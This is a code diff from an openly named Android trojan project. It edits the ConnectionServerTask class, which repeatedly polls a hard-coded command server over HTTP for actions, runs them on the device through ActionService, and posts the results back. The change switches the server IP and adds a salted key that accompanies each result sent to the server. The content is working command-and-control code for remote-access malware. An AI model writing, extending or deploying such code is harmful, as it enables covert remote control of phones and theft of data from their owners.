@@ -21,24 +21,26 @@ import java.util.ArrayList;
 import java.util.List;
 
 import trojan.android.android_trojan.ActionService;
+import trojan.android.android_trojan.R;
 import trojan.android.android_trojan.Tools;
 
-/**
- * Created by hoodlums on 14/01/15.
- */
+
 public class ConnectionServerTask extends AsyncTask<Void, Void, Void> {
     private static final String TAG = "ConnectionServerTask";
     private HttpClient httpClient;
     private ActionService actionService;
-    private String address="10.10.160.37";
+    private String address="192.168.1.59";
     private String port="8080";
     private String urlaction = "http://"+address+":"+port+"/action";
     private String urlresult = "http://"+address+":"+port+"/result";
     private Context context;
     private int time = 3000;
+    private String SALT = "LOL";
+    private String KEY = null;
 
     public ConnectionServerTask(Context context){
         this.context = context;
+        this.KEY = SALT + context.getResources().getString(R.string.KEY);
     }
 
     @Override
@@ -60,7 +62,7 @@ public class ConnectionServerTask extends AsyncTask<Void, Void, Void> {
             if(result != null && !result.equals("null")){
                 List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(1);
                 nameValuePairs.add(new BasicNameValuePair("result", actionService.action(result)));
-
+                nameValuePairs.add(new BasicNameValuePair("KEY", this.KEY));
                 postHttp(urlresult, nameValuePairs);
             }
             Tools.sleep(time);
